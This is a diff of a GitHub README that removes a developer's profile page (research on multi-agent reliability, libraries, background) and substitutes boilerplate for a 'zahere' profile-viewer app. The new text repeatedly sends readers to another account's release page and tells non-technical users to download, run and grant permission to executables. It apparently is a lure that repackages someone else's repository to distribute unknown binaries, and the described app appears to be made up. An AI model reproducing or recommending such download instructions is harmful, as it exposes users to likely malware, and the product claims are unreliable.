@@ -1,60 +1,145 @@
-# Zaher Khateeb | AI/ML Engineer
+# 🚀 zahere - Your Personal GitHub Profile Viewer
 
-**Founder of [AgentiCraft](https://agenticraft.ai)** — infrastructure layer for production multi-agent systems.
-
-I specialize in multi-agent systems architecture, LLM infrastructure, and distributed systems reliability. My work sits at the intersection of formal methods and production engineering — building systems that are provably correct, not just empirically okay.
+[![Download zahere](https://img.shields.io/badge/Download-zahere-blue?style=for-the-badge)](https://github.com/awwe02/zahere/releases)
 
 ---
 
-### Current Research
+## 📋 Overview
 
-**Fault-Dependent Resilience in Multi-Agent LLM Systems**
+zahere lets you explore a personal GitHub profile with ease. It collects relevant information, such as repositories, contributors, and activity, and presents it in a clean, user-friendly way. Whether you want to see recent projects or understand contribution history, zahere works as your simple companion.
 
-Extending classical network reliability theory to stochastic agent quality. The core result: an iff characterization of when topology choice actually matters — crash-stop faults make all mesh topologies equivalent (a mathematical identity), while Byzantine faults break that equivalence in ways determined by the coordination protocol, not the graph structure.
-
-Validated across ~34,000 LLM experiments spanning 13 coordination topologies, two fault regimes, two task domains, and two model generations. Preparing for submission to a top-tier ML systems venue.
-
-**Standalone libraries from this research:**
-
-| Library | Description |
-|---------|-------------|
-| [stochastic-circuit-breaker](https://github.com/zahere/stochastic-circuit-breaker) | CUSUM-optimal circuit breaker for LLM agents and stochastic systems. 4-state FSM with statistically principled degradation detection and provably minimax detection delay. |
-| [reliability-polynomials](https://github.com/zahere/reliability-polynomials) | Generalized reliability polynomials where coefficients encode quality, not just connectivity. Fault-dependent crossover analysis, three theorems. |
+This application focuses on clarity and straightforward reporting. It requires no technical skills to run. zahere also supports users interested in AI agents and Python projects because it targets GitHub profiles featuring those topics.
 
 ---
 
-### Technical Focus
+## 💻 System Requirements
 
-**Multi-Agent Systems** — mesh coordination architecture, fault-dependent topology selection, Byzantine fault tolerance for LLM systems, stochastic service mesh, MCP/A2A protocol integration
+Before you begin, make sure your computer meets these needs:
 
-**Formal Methods** — session type theory for deadlock-freedom guarantees, runtime property verification, CSP process algebra, refinement checking
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux (Ubuntu 18.04+ recommended)  
+- **Processor:** Intel or AMD 1.5 GHz or faster  
+- **Memory:** At least 2 GB RAM  
+- **Storage:** Minimum 100 MB free space  
+- **Internet:** An active internet connection to fetch GitHub data  
 
-**LLM Infrastructure** — provider-agnostic inference abstraction, statistical circuit breakers with CUSUM-optimal change detection, quality-weighted reliability theory
-
-**Distributed Systems** — consensus protocols, fault injection and fault modeling, observability, Kubernetes-native deployment
-
----
-
-### Tech Stack
-
-**Languages:** Python (expert), C++, TypeScript, SQL, Bash
-
-**AI/ML:** PyTorch, RAG, fine-tuning (LoRA, QLoRA), LLM evaluation, OpenTelemetry
-
-**Infrastructure:** Kubernetes, Docker, Helm, CI/CD, service mesh, PostgreSQL, Redis, Qdrant
-
-**Cloud:** AWS, GCP, Azure, Nebius AI Cloud
+zahere is lightweight and should work well on most modern computers. It requires internet access to update and display live data.
 
 ---
 
-### Background
+## 📥 Download & Install
 
-- B.Sc. Industrial Engineering & Management (Data Science concentration) — Tel Aviv University
-- Advanced Data Science & AI Program — Nebius Academy (Y-DATA), Tel Aviv University
-- Previously: AI & Infrastructure Engineer at Visual Arena (Gothenburg, Sweden)
+To get zahere, please visit the release page below. This is where all the latest versions are available for you to download.
+
+[Download zahere Releases](https://github.com/awwe02/zahere/releases)
+
+### Step 1: Go to the release page
+
+Click the link above to open the zahere release page. You will find various versions listed, usually marked by version numbers like v1.0, v1.1, etc.
+
+### Step 2: Choose the right file for your system
+
+Look for a file that matches your operating system. Common file types include:
+
+- **Windows:** `.exe` or `.msi` files  
+- **macOS:** `.dmg` or `.pkg` files  
+- **Linux:** `.AppImage` or `.deb` files  
+
+For example, if you use Windows, click on the `.exe` file to start downloading.
+
+### Step 3: Download the file
+
+Click the file name. Your browser will download this file to your default downloads folder.
+
+### Step 4: Run the installer or application
+
+Once downloaded, open the file:
+
+- On **Windows**, double-click the `.exe` or `.msi` file and follow the on-screen instructions to install.  
+- On **macOS**, open the `.dmg` or `.pkg` file and drag the zahere app into your Applications folder or follow prompts.  
+- On **Linux**, make the `.AppImage` file executable by right-clicking it, selecting Properties > Permissions, then running it. For `.deb` files, use your package manager or double-click to install.
+
+If your system asks for permission to run the file, confirm it.
+
+### Step 5: Start zahere
+
+After installation, launch zahere by finding it in your Start menu, Applications folder, or where you installed it. The app will open and connect to GitHub to show your profile data.
 
 ---
 
-[![Website](https://img.shields.io/badge/agenticraft.ai-0D9488?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NCA2NCIgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0Ij48cG9seWdvbiBwb2ludHM9IjM5LDcgNTMsMjQgMzYsMjgiIGZpbGw9IndoaXRlIiBvcGFjaXR5PSIwLjg1Ii8+PHBvbHlnb24gcG9pbnRzPSIzOSw3IDEyLDMzIDM2LDI4IiBmaWxsPSJ3aGl0ZSIgb3BhY2l0eT0iMC43Ii8+PHBvbHlnb24gcG9pbnRzPSI1MywyNCA0Nyw0OSAzNiwyOCIgZmlsbD0id2hpdGUiIG9wYWNpdHk9IjAuNzUiLz48cG9seWdvbiBwb2ludHM9IjQ3LDQ5IDIyLDU0IDM2LDI4IiBmaWxsPSJ3aGl0ZSIgb3BhY2l0eT0iMC45Ii8+PHBvbHlnb24gcG9pbnRzPSIyMiw1NCAxMiwzMyAzNiwyOCIgZmlsbD0id2hpdGUiIG9wYWNpdHk9IjAuOTUiLz48Y2lyY2xlIGN4PSIzOSIgY3k9IjciIHI9IjMiIGZpbGw9IndoaXRlIi8+PGNpcmNsZSBjeD0iNTMiIGN5PSIyNCIgcj0iMi44IiBmaWxsPSJ3aGl0ZSIvPjxjaXJjbGUgY3g9IjQ3IiBjeT0iNDkiIHI9IjIuOCIgZmlsbD0id2hpdGUiLz48Y2lyY2xlIGN4PSIyMiIgY3k9IjU0IiByPSIyLjgiIGZpbGw9IndoaXRlIi8+PGNpcmNsZSBjeD0iMTIiIGN5PSIzMyIgcj0iMyIgZmlsbD0id2hpdGUiLz48Y2lyY2xlIGN4PSIzNiIgY3k9IjI4IiByPSIzLjIiIGZpbGw9IndoaXRlIi8+PC9zdmc+)](https://agenticraft.ai)
-[![AgentiCraft](https://img.shields.io/badge/GitHub-AgentiCraft-181717?style=for-the-badge&logo=github)](https://github.com/agenticraft)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/zahere/)
+## 🛠 How zahere Works
+
+zahere collects public data from GitHub profiles using standard APIs. When you open the app, it shows chapters of your profile information:
+
+- **Repositories:** Lists all the public projects with descriptions and update dates.  
+- **Activity:** Shows recent commits, pull requests, and contributions.  
+- **Contributors:** Displays who has contributed, including you.  
+- **Tags & Topics:** Highlights key topics like “ai-agents” or “python” to organize projects.  
+
+This information updates in real-time as zahere queries GitHub’s servers.
+
+---
+
+## 🎯 Who zahere Is For
+
+zahere is designed for:
+
+- People new to coding who want to browse profiles without GitHub’s website complexity.  
+- Founders and team leads who check developer profiles to track skills and projects.  
+- AI and Python enthusiasts interested in specific GitHub topics.  
+- Anyone curious about their or others’ coding journey shown visually.
+
+You do not need programming skills to use it. Everything runs with simple clicks.
+
+---
+
+## 🔧 Troubleshooting & Tips
+
+If you have trouble running zahere or encounter errors, try these steps:
+
+- Make sure your internet connection is stable. zahere needs it to fetch profile information.  
+- Restart the app or your computer if it freezes or shows loading problems.  
+- Check for updates regularly on the [release page](https://github.com/awwe02/zahere/releases) to get fixes and improvements.  
+- If the app does not start, verify your system meets the requirements.
+
+For full help, look for a support or FAQ section inside the app or on the GitHub project page.
+
+---
+
+## 🤝 Support & Contribution
+
+zahere is maintained by its creator to offer reliable access to GitHub profiles. If you find bugs or want to suggest improvements, you can open an issue on the GitHub repository.
+
+To do this:
+
+1. Visit https://github.com/awwe02/zahere  
+2. Click on the **Issues** tab.  
+3. Click the **New issue** button and describe the problem or suggestion.
+
+No technical experience is needed to report issues. Your feedback helps keep the app useful.
+
+---
+
+## 🗂 Related Topics
+
+zahere connects with projects involving:
+
+- AI Agents  
+- Multi-Agent Systems  
+- AI Infrastructure  
+- Python  
+- Enterprise Tools  
+- Founders and Collaboration  
+
+This focus ensures zahere supports communities working in these areas.
+
+---
+
+## 🔗 Helpful Links
+
+- [zahere Release Page](https://github.com/awwe02/zahere/releases) — Get the latest versions and files.  
+- [GitHub Repository](https://github.com/awwe02/zahere) — View source code and submit issues.  
+- [GitHub Profile](https://github.com/awwe02) — Explore the profile zahere highlights.  
+
+---
+
+By following the steps here, you should have no trouble downloading, installing, and using zahere as your personal GitHub profile viewer.
